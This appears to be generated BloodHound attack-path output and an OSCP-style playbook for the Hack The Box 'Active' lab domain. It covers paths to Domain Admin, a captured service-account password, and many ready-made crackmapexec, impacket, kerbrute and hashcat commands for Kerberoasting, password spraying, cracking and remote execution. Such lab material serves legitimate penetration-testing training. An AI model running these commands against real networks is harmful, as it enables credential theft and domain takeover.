| DOMAIN ADMINS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DEFAULT DOMAIN CONTROLLERS POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DEFAULT DOMAIN POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN USERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN COMPUTERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN GUESTS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |

### ⚪ GPO Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ OU Control for Object Manipulation
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ AllExtendedRights Enumeration
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Read LAPS Password Rights
**OSCP Relevance:** HIGH | **Results:** None

### ✅ All Domain Admins
**OSCP Relevance:** HIGH | **Results:** 1

> List all members of Domain Admins group (including nested membership). Know your targets.

| DomainAdmin | Enabled | AdminCount |
| --- | --- | --- |
| ADMINISTRATOR@ACTIVE.HTB | True | True |

### ⚪ GenericWrite on Users
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteSPN for Targeted Kerberoasting
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteAccountRestrictions for RBCD
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ SyncLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddAllowedToAct Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ DCSync (Composite Check)
**OSCP Relevance:** HIGH | **Results:** None

---

## Attack Chains

### ⚪ Full Attack Path: Owned User -> Pivot -> DA
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Shortest Path to Domain Admins
**OSCP Relevance:** HIGH | **Results:** 1

> Find shortest privilege escalation path from any enabled user to Domain Admins group.

| StartUser | Hops | Path |
| --- | --- | --- |
| SVC_TGS@ACTIVE.HTB | 3 | ['SVC_TGS@ACTIVE.HTB', 'DOMAIN USERS@ACTIVE.HTB', 'USERS@ACTIVE.HTB', 'DOMAIN ADMINS@ACTIVE.HTB'] |

### ⚪ All Paths to Domain Admin (Multi-Hop)
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Credential Harvest Opportunities
**OSCP Relevance:** HIGH | **Results:** None

### Find Paths Through Specific Computer
*Skipped - requires variables: COMPUTER*

### Shortest Path Between Two Users
*Skipped - requires variables: SOURCE_USER, TARGET_USER*

### ⚪ Path to High-Value Targets
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Circular Group Memberships
**OSCP Relevance:** LOW | **Results:** None

---

## Owned Principal

### What Can Owned User Access?
*Skipped - requires variables: USER*

### Quick Wins from Owned User Context
*Skipped - requires variables: USER*

### Path to DA from Owned User
*Skipped - requires variables: USER*

### Owned User Group Memberships
*Skipped - requires variables: USER*

### Outbound Object Control from Owned
*Skipped - requires variables: USER*

### First Hop Lateral Movement
*Skipped - requires variables: USER*

### Kerberoastable from Owned Context
*Skipped - requires variables: USER*

### ⚪ AS-REP Targets from Owned Context
**OSCP Relevance:** HIGH | **Results:** None

### Session Harvest Opportunities
*Skipped - requires variables: USER*

### Chained Privilege Escalation
*Skipped - requires variables: USER*

---

## Operational

### ✅ Computers by Operating System (Find Legacy)
**OSCP Relevance:** MEDIUM | **Results:** 1

> Enumerate computers grouped by OS. Legacy systems (2008, 2003, XP) are often more vulnerable.

| OS | Computers | Count |
| --- | --- | --- |
| Windows Server 2008 R2 Standard Service Pack 1 | ['DC.ACTIVE.HTB'] | 1 |

### ✅ Legacy Windows Systems
**OSCP Relevance:** HIGH | **Results:** 1

> Find Windows Server 2008/2003 and Windows 7/XP systems. Often missing patches and vulnerable to known exploits.

| Computer | OS |
| --- | --- |
| DC.ACTIVE.HTB | Windows Server 2008 R2 Standard Service Pack 1 |

### ✅ Password Age Distribution
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find users with old passwords. Old passwords may be weak or appear in breach databases.

| User | PasswordLastSet | IsPrivileged | Description |
| --- | --- | --- | --- |
| ADMINISTRATOR@ACTIVE.HTB | 7 years ago | True | Built-in account for administering the computer/domain |
| SVC_TGS@ACTIVE.HTB | 7 years ago | False |  |

### ✅ Inactive User Accounts
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find enabled users who haven't logged in recently. May have default or forgotten passwords.

| User | LastLogon | Description |
| --- | --- | --- |
| SVC_TGS@ACTIVE.HTB | 7 years ago |  |
| ADMINISTRATOR@ACTIVE.HTB | 4 days ago | Built-in account for administering the computer/domain |

### ✅ Enabled vs Disabled Account Ratio
**OSCP Relevance:** LOW | **Results:** 3

> Count enabled vs disabled accounts. High disabled count may indicate account churn.

| Enabled | Count |
| --- | --- |
|  | 1 |
| True | 2 |
| False | 3 |

### ⚪ Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Relationship Count by Type
**OSCP Relevance:** LOW | **Results:** 36

> Count all relationship types in the database. Helps understand AD structure and attack surface.

| Relationship | Count |
| --- | --- |
| TAGGED | 17814 |
| HAS_INDICATOR | 13218 |
| HAS_FLAG | 7054 |
| NEXT_STEP | 2405 |
| ALTERNATIVE | 2339 |
| REFERENCES_COMMAND | 1332 |
| PREREQUISITE | 1140 |
| HAS_SIGNAL | 610 |
| HAS_STEP | 416 |
| EXECUTES | 358 |
| GenericAll | 234 |
| WriteOwner | 211 |
| WriteDacl | 211 |
| WriteOwnerRaw | 204 |
| GenericWrite | 149 |
| DEMONSTRATES | 132 |
| Owns | 129 |
| OwnsRaw | 124 |
| HAS_FINDING | 78 |
| MemberOf | 66 |
| Contains | 52 |
| TEACHES_SKILL | 46 |
| AFFECTS | 38 |
| REQUIRES_SKILL | 28 |
| AllExtendedRights | 20 |
| AdminTo | 6 |
| GetChanges | 6 |
| GetChangesAll | 6 |
| FROM_PLATFORM | 6 |
| GetChangesInFilteredSet | 4 |
| GPLink | 4 |
| CoerceToTGT | 2 |
| TARGETS | 2 |
| HAS_CREDENTIAL | 2 |
| EXPLOITS_CVE | 2 |
| TEACHES_TECHNIQUE | 2 |

### ✅ High-Value Target Summary
**OSCP Relevance:** HIGH | **Results:** 9

> List all objects marked as high-value in BloodHound. Primary targets for attack planning.

| Target | Type | Description |
| --- | --- | --- |
| ACTIVE.HTB | ['Base', 'Domain', 'Tag_Tier_Zero'] |  |
| ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain user and group accounts |
| ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Administrators have complete and unrestricted access to the computer/domain |
| BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the enterprise |
| PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain printers |
| SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain servers |

---

## Summary

| Metric | Count |
| ------ | ----- |
| Total Queries | 74 |
| With Results | 20 |
| No Results | 40 |
| Skipped | 14 |
| Failed | 0 |

### Key Findings

- **WriteDacl Abuse Paths**: 54 results (Privilege Escalation)
- **WriteOwner Abuse Paths**: 54 results (Privilege Escalation)
- **Owns Relationships on Users/Groups**: 21 results (Privilege Escalation)
- **GenericAll on High-Value Targets**: 17 results (Privilege Escalation)
- **High-Value Target Summary**: 9 results (Operational)
- **DCSync Rights**: 6 results (Privilege Escalation)
- **Kerberoastable Service Accounts**: 1 results (Quick Wins)
- **High-Value Kerberoastable (Privileged + SPN)**: 1 results (Quick Wins)
- **Unconstrained Delegation Systems**: 1 results (Quick Wins)
- **Coercion Targets (Unconstrained Delegation)**: 1 results (Lateral Movement)
- **All Domain Admins**: 1 results (Privilege Escalation)
- **Shortest Path to Domain Admins**: 1 results (Attack Chains)
- **Legacy Windows Systems**: 1 results (Operational)


## 🎯 Pwned User Attack Paths

### SVC_TGS@ACTIVE.HTB
**Credential:** password

#### Manual Enumeration (BloodHound edges may be incomplete)

> BloodHound may not capture all access:
> - Service accounts often have local admin where they run
> - Local group memberships require SMB enumeration during collection

**Network-Wide Testing**

| Test | Command |
|------|---------|
| Test Admin Access | `crackmapexec smb <TARGET_SUBNET> -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb` |
| Enumerate Shares | `crackmapexec smb <TARGET_SUBNET> -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --shares` |

**Optional (medium priority)**

| Test | Command |
|------|---------|
| Test WinRM | `crackmapexec winrm <TARGET_SUBNET> -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb` |
| Test RDP | `crackmapexec rdp <TARGET_SUBNET> -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb` |
| Enum Sessions | `crackmapexec smb <TARGET_SUBNET> -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --sessions` |

> **Tip:** Look for `(Pwn3d!)` in output - that means admin access BloodHound missed!

#### Authenticated User Attacks (Any Domain User)

Replace placeholders with your credentials:

| Attack | Command Template |
|--------|------------------|
| AS-REP Roasting ⚡ | `impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| Kerberoasting ⚡ | `impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| BloodHound Collection ⚡ | `bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>` |
| Domain User Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users` |
| Domain Admins Members | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'` |
| Share Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares` |
| Computer Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers` |
| Password Policy | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol` |
| Domain Trust Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts` |
| GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |


# Tailored Spray Commands

Based on BloodHound access relationships.

## Summary

- **Users with access:** 1
- **Target machines:** 1
- **Access types:** AdminTo

## Local Admin (AdminTo)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `administrator`

**Targets:**

- `DC.ACTIVE.HTB`

#### File-based commands

```bash
# Create user and target files
echo -e "administrator" > users_g1.txt
echo -e "DC" > targets_g1.txt
crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in administrator; do
  for target in DC; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i DC -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'ACTIVE/administrator:<PASSWORD>'@DC
```

```bash
# WMIExec
impacket-wmiexec 'ACTIVE/administrator:<PASSWORD>'@DC
```

## Monolithic Spray

One attempt per user on their best target. Set `PASSWORD` once at the top.

### Edge Selection Logic

```
  1 user via AdminTo (local admin → SMB auth)
  0 users via CanRDP (RDP → xfreerdp3 auth)
  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword
  Each user sprayed exactly once on their highest-privilege target
```

### Commands

```bash
PASSWORD='<PASSWORD>'

# --- administrator → DC (DC) ---
# AdminTo (direct): MATCH (administrator)-[:AdminTo]->(DC)
crackmapexec smb DC -u administrator -p "$PASSWORD"

```

---

> **NOTE:** Replace `<PASSWORD>` with actual credentials.


## 🔑 Password Spray Recommendations

### Captured Passwords

```
GPPstillStandingStrong2k18
```

### Spray Methods

#### Method 1: SMB-Based Spray (crackmapexec/netexec)

Ports: 445 | Noise: HIGH

```bash
crackmapexec smb <DC_IP> -u users.txt -p 'GPPstillStandingStrong2k18' -d active.htb --continue-on-success
```
- ✅ Shows admin access (Pwn3d!), validates creds + checks admin in one step
- ❌ Very noisy (Event logs 4625), triggers lockouts, detected by EDR

#### Method 2: Kerberos TGT-Based Spray (kerbrute)

Ports: 88 | Noise: LOW

```bash
kerbrute passwordspray -d active.htb --dc <DC_IP> users.txt 'GPPstillStandingStrong2k18'
```
- ✅ Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
- ❌ No admin check (just validates creds), requires valid userlist, Kerberos only

#### Method 3: LDAP/ADSI-Based Spray (PowerShell)

Ports: 389, 636 | Noise: MEDIUM

```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 'GPPstillStandingStrong2k18' -Verbose
```
- ✅ Built into Windows - no external tools needed, uses native APIs, scriptable
- ❌ Windows-only, slower than Kerberos, requires PowerShell access on target

### User Enumeration

**Enumerate valid users via Kerberos pre-auth**
```bash
kerbrute userenum -d active.htb --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
```

**LDAP enumeration with credentials**
```bash
ldapsearch -x -H ldap://<DC_IP> -D 'active.htb\SVC_TGS' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
```

**CME user enumeration (authenticated)**
```bash
crackmapexec smb <DC_IP> -u 'SVC_TGS' -p '<PASSWORD>' -d active.htb --users | awk '{print $5}' | grep -v '\[' > users.txt
```

**Export users from BloodHound Neo4j (clean output)**
```bash
echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
```

**RPC user enumeration**
```bash
rpcclient -U 'SVC_TGS%<PASSWORD>' <DC_IP> -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
```

**enum4linux user enumeration (unauthenticated if allowed)**
```bash
enum4linux -U <DC_IP> | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt
```

### Spray One-Liners

**1. Full Neo4j Spray (Stealth)**
_Export non-pwned users + passwords from Neo4j, spray with kerbrute_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d active.htb --dc <DC_IP> targets.txt "$p"; sleep 1800; done
```

**2. Neo4j Spray + Admin Check (CME)**
_Export from Neo4j, spray with CME to identify admin access (Pwn3d!)_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | sort -u > spray_passwords.txt && crackmapexec smb <DC_IP> -u targets.txt -p spray_passwords.txt -d active.htb --continue-on-success --no-bruteforce
```

**3. AS-REP Roast -> Crack -> Spray**
_Roast AS-REP users, crack hashes, spray cracked passwords_
```bash
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.txt active.htb/ && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d active.htb --continue-on-success --no-bruteforce
```

**4. Kerberoast -> Crack -> Spray**
_Kerberoast SPNs, crack TGS hashes, spray cracked passwords_
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile kerberoast.txt 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --show | cut -d':' -f2 >> spray_passwords.txt && crackmapexec smb <DC_IP> -u users.txt -p spray_passwords.txt -d active.htb --continue-on-success --no-bruteforce
```

**5. CeWL -> Mutate -> Spray**
_Generate wordlist from website, apply mutations, spray_
```bash
cewl -d 2 -m 5 -w cewl_words.txt <TARGET_URL> && hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_words.txt | sort -u > spray_passwords.txt && kerbrute passwordspray -d active.htb --dc <DC_IP> users.txt spray_passwords.txt
```

> **EXAM TIP:** Before spraying, check `net accounts` for lockout policy.
